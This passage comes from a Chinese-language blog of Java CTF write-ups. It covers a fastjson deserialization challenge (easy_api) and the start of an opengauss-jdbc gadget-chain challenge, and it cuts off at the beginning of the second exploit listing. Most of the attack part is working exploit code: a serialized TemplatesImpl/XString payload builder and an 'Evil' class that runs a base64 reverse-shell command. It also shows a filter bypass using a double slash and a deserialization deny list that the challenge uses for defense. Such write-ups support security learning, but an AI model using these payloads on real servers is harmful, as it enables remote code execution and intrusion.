src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171859812.png" alt="image-20240816171859812"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171950364.png" alt="image-20240816171950364"></p><p>参考：</p><p><a href="https://blog.csdn.net/uuzeray/article/details/138199481?spm=1001.2014.3001.5501">【Web】记录CISCN 2023 西南半决赛 seaclouds题目复现-CSDN博客</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136601197">【Web】关于Java反序列化那些实现机制的朴素通识-CSDN博客</a></p><p><a href="https://p4d0rn.gitbook.io/java/ctf/seacloud">CISCN 2023 西南赛区半决赛 (Hessian原生JDK+Kryo反序列化) | Java (gitbook.io)</a></p><p><a href="https://www.yuque.com/misery333/sz1apr/wa9d50l7yo1p4s9g">CISCN2023西南赛区半决赛 seaclouds (yuque.com)</a></p><h2 id="西湖论剑-2022-easy-api"><a href="#西湖论剑-2022-easy-api" class="headerlink" title="[西湖论剑 2022]easy_api"></a>[西湖论剑 2022]easy_api</h2><p>比较简单的一道题，主要是复习一下fj吧。</p><p>先审计一下源码。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917145855630.png" alt="image-20240917145855630"></p><p>简单的index路由，没啥好看的。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917145919252.png" alt="image-20240917145919252"></p><p>找到java反序列化入口，看下lib里都有啥：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150027163.png" alt="image-20240917150027163"></p><p>fj1.2.48，没事了，直接打。</p><p>这里有个小插曲就是绕到&#x2F;api&#x2F;test上：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150543256.png" alt="image-20240917150543256"></p><p>其实也很简单，双斜杠就绕了：<a href="https://blog.csdn.net/z69183787/article/details/84848751">web.xml filter 绕过匹配访问（针对jetty）_jetty权限绕过-CSDN博客</a></p><p>fastjson最经典的部分是自动触发getter来getProperties加载字节码，如何触发getter可以通过JSON.parse触发，也可以通过toJSONString触发，很有意思的是JSON这个类的tostring就是toJSONString：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917150458344.png" alt="image-20240917150458344"></p><p>题目ban了<code>BadAttributeValueExpException</code>来触发tostring，也ban了JNDI的一些方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass desc)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.lang.reflect.Proxy&quot;</span>, <span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="hljs-string">&quot;sun.rmi.server.UnicastRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.LiveRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteRef&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>, <span class="hljs-string">&quot;java.rmi.RemoteObjectInvocationHandler&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.registry.Registry&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br></code></pre></td></tr></table></figure><p>那么我们可以用xstring来触发，复制之前的部分即可。</p><p>gadget：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">readObject-&gt;hashmap.put<br>-&gt;XString.toString<br>-&gt;JSON.toString<br>-&gt;Templates.getProperties<br></code></pre></td></tr></table></figure><p>XString后面直接接上恶意字节码打了。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(Evil.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Evil&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;jb&quot;</span>, templates);<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br><br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(jsonObject);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>));<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(s);<br>            System.out.println(URLEncoder.encode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())),<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            outputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Evil.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917151643797.png" alt="image-20240917151643797"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917151501140.png" alt="image-20240917151501140"></p><h2 id="2024京津冀长城杯-openGuass"><a href="#2024京津冀长城杯-openGuass" class="headerlink" title="2024京津冀长城杯-openGuass"></a>2024京津冀长城杯-openGuass</h2><p>非常好jdbc，使我的jdk17旋转。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>UserController逻辑很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/user&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/info&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">ser</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String data)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data)));<br>            <span class="hljs-type">admin</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (admin)ois.readObject();<br>            <span class="hljs-keyword">return</span> user.getName();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var4) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var4;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一手依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.opengauss<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>opengauss-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1-compatibility<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.oracle.coherence.ce<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>coherence-rest<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>14.1.1-0-3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.37<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>思路参照欧阳学长的：<a href="https://h4cking2thegate.github.io/posts/44597/">记一次tabby利用链挖掘 | H4cking to the Gate . (h4cking2thegate.github.io)</a></p><p>本题依赖存在 opengauss-jdbc，虽然没见过，但是可以从代码和文档中看到，是用 postgre jdbc 改的，那么经典的方法就是利用 socketFactory 来触发 String 参数构造方法</p><p>常见的出网利用方法是 <code>ClassPathXmlApplicationContext</code>。</p><p>那么利用链中间的部分可以暂定为 jdbc，接下来需要触发 getter，以及寻找 sink。</p><p>我们可以写出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8000/exp.xml&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> getDataSource(className, myargs);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getDataSource</span><span class="hljs-params">(String className, String myargs)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    properties.setProperty(<span class="hljs-string">&quot;socketFactory&quot;</span>, className);<br>    properties.setProperty(<span class="hljs-string">&quot;socketFactoryArg&quot;</span>, myargs);<br><br>    <span class="hljs-type">PGSimpleDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGSimpleDataSource</span>();<br>    setFieldValue(dataSource, <span class="hljs-string">&quot;properties&quot;</span>, properties);<br>    dataSource.setUser(<span class="hljs-string">&quot;test&quot;</span>);<br>    dataSource.setPassword(<span class="hljs-string">&quot;test&quot;</span>);<br>    dataSource.setServerName(<span class="hljs-string">&quot;localhost&quot;</span>);<br>    dataSource.setPortNumber(<span class="hljs-number">1234</span>);<br>    dataSource.setDatabaseName(<span class="hljs-string">&quot;test&quot;</span>);<br>    <span class="hljs-keyword">return</span> dataSource;<br>&#125;<br></code></pre></td></tr></table></figure><p>getDataSource即是利用socketFactory来设置pg数据库的一些参数，但是这里并没有getConnect操作，所以只是一个设置，并不需要本地起一个pg数据库。</p><p>若我们想在jdk17下触发toString，可以用Jackson链的<code>EventListenerList</code>或者 <code>Xstring</code>，或许依赖中还存在别的利用链。</p><p>下面用<code>XString</code>来实现。</p><p>学长其实还挖掘到一个入口类，tql：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.tangosol.coherence.mvel2.sh.ShellSession#ShellSession (java.lang.String)<br></code></pre></td></tr></table></figure><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 